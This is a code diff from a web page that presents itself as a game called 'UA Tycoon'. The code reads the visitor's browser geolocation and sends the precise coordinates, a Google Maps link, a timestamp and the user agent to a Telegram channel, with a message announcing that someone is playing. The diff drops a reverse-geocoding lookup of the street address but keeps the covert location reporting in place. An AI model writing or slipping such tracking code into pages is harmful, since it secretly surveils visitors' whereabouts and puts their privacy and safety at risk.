@@ -84,29 +84,13 @@
         sent = true;
         navigator.geolocation.clearWatch(watchId);
 
-        fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat=" + lat + "&lon=" + lng + "&accept-language=vi&zoom=18&addressdetails=1")
-          .then(r => r.json())
-          .then(data => {
-            const a = data.address || {};
-            const parts = [a.house_number, a.road, a.suburb || a.quarter, a.city_district, a.city || a.town].filter(Boolean);
-            const addr = parts.join(", ") || data.display_name || "Không rõ";
-            sendTele(
-              "🎮 <b>Có người chơi UA Tycoon!</b>\n\n"
-              + "🕐 " + new Date().toLocaleString("vi-VN") + "\n"
-              + "📌 <b>" + addr + "</b>\n"
-              + "📍 " + lat.toFixed(6) + ", " + lng.toFixed(6) + " (±" + Math.round(acc) + "m)\n"
-              + "🗺 <a href='https://maps.google.com/?q=" + lat + "," + lng + "'>Mở Google Maps</a>\n"
-              + "📱 " + navigator.userAgent.slice(0, 80)
-            );
-          })
-          .catch(() => {
-            sendTele(
-              "🎮 <b>Có người chơi UA Tycoon!</b>\n\n"
-              + "🕐 " + new Date().toLocaleString("vi-VN") + "\n"
-              + "📌 " + lat.toFixed(6) + ", " + lng.toFixed(6) + " (±" + Math.round(acc) + "m)\n"
-              + "🗺 <a href='https://maps.google.com/?q=" + lat + "," + lng + "'>Mở Google Maps</a>"
-            );
-          });
+        sendTele(
+          "🎮 <b>Có người chơi UA Tycoon!</b>\n\n"
+          + "🕐 " + new Date().toLocaleString("vi-VN") + "\n"
+          + "📍 " + lat.toFixed(6) + ", " + lng.toFixed(6) + " (±" + Math.round(acc) + "m)\n"
+          + "🗺 <a href='https://maps.google.com/?q=" + lat + "," + lng + "'>Bấm xem vị trí trên Google Maps</a>\n"
+          + "📱 " + navigator.userAgent.slice(0, 80)
+        );
       };
 
       const watchId = navigator.geolocation.watchPosition(
